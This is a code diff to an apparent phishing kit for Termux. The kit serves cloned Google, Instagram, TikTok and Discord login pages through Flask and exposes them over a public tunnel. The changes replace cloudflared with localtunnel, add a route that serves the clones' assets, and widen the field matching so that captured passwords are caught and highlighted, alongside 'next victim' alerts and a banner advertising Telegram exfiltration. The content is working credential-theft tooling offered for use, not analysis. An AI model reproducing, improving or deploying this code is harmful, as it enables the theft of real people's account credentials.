@@ -5,7 +5,7 @@ import os, sys, json, subprocess, threading, time, re, socket, itertools
 from datetime import datetime
 
 try:
-    from flask import Flask, request, render_template_string, redirect
+    from flask import Flask, request, render_template_string, redirect, send_from_directory
     import requests
 except ImportError:
     print("[!] missing deps. run: bash install.sh")
@@ -52,7 +52,7 @@ def banner():
     out = []
     for i, line in enumerate(BANNER_LINES):
         out.append(GRAD[i % len(GRAD)] + line + N)
-    out.append(f"{W}        v3.0 {D}— termux edition{N} {M}|{N} {C}cloudflared{N} {M}|{N} {C}tg exfil{N} {M}|{N} {C}live stats{N}")
+    out.append(f"{W}        v3.1 {D}— termux edition{N} {M}|{N} {C}localtunnel{N} {M}|{N} {C}tg exfil{N} {M}|{N} {C}live stats{N}")
     return "\n".join(out)
 
 SITES = ["google", "instagram", "tiktok", "discord"]
@@ -113,8 +113,8 @@ def hit_alert(creds):
     print(f"\a", end="")  # terminal bell
     lines = []
     for k, v in creds.items():
-        icon = "◆" if k in ("password",) else ("●" if k in ("email","username") else "○")
-        vc = f"{R}{W}{v}{N}" if k == "password" else f"{W}{v}{N}"
+        icon = "◆" if k in ("password", "pass") else ("●" if k in ("email","username") else "○")
+        vc = f"{R}{W}{v}{N}" if k in ("password", "pass") else f"{W}{v}{N}"
         lines.append(f"{M}{icon}{N} {C}{k:>9}{N} {D}→{N} {vc}")
     box(f" CREDENTIALS CAPTURED — {creds['site'].upper()} ", lines, G)
     print(f"{Y}[*] still listening... next victim pls{N}\n")
@@ -193,30 +193,40 @@ def index():
     with open(os.path.join(SITE_DIR, site, "index.html")) as f:
         return render_template_string(f.read())
 
+@app.route("/<path:filename>")
+def assets(filename):
+    # serve css/js/images/fonts from the active template dir
+    site_dir = os.path.join(SITE_DIR, app.config["SITE"])
+    if os.path.exists(os.path.join(site_dir, filename)):
+        return send_from_directory(site_dir, filename)
+    return redirect("/")
+
 # ---------- tunneling ----------
-def cloudflared_bin():
-    local = os.path.join(BASE_DIR, "cloudflared")
-    if os.path.exists(local):
-        return local
-    return "cloudflared"
+def lt_bin():
+    for cand in [os.path.join(BASE_DIR, "node_modules", ".bin", "lt"),
+                 "/data/data/com.termux/files/usr/bin/lt", "lt"]:
+        if os.path.exists(cand):
+            return cand
+    return "lt"
 
 def start_tunnel(port):
     done = threading.Event()
     t = threading.Thread(target=spinner,
-                         args=(f"establishing cloudflared tunnel on :{port}...", done),
+                         args=(f"establishing localtunnel on :{port}...", done),
                          daemon=True)
     t.start()
     proc = subprocess.Popen(
-        [cloudflared_bin(), "tunnel", "--url", f"http://localhost:{port}"],
+        [lt_bin(), "--port", str(port)],
         stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     url_found = None
     start = time.time()
     for line in proc.stdout:
-        m = re.search(r"https://[-a-z0-9]+\.trycloudflare\.com", line)
+        # localtunnel prints: "your url is: https://xyz.loca.lt"
+        m = re.search(r"https://[a-z0-9-]+\.loca\.lt", line)
         if m:
             url_found = m.group(0)
             break
-        if time.time() - start > 45:
+        if time.time() - start > 30:
             break
     done.set(); t.join()
     if url_found:
@@ -234,7 +244,9 @@ def start_tunnel(port):
             pass
         print(f"\n{Y}[*] waiting for victims... {D}(ctrl+c to stop){N}")
     else:
-        print(f"{R}[!] tunnel failed. is cloudflared installed? run: bash install.sh{N}")
+        print(f"{R}[!] tunnel failed. is localtunnel installed?")
+        print(f"    termux: {W}npm install -g localtunnel{N}")
+        print(f"    or run: {W}bash install.sh{N}")
         sys.exit(1)
 
 # ---------- helpers ----------
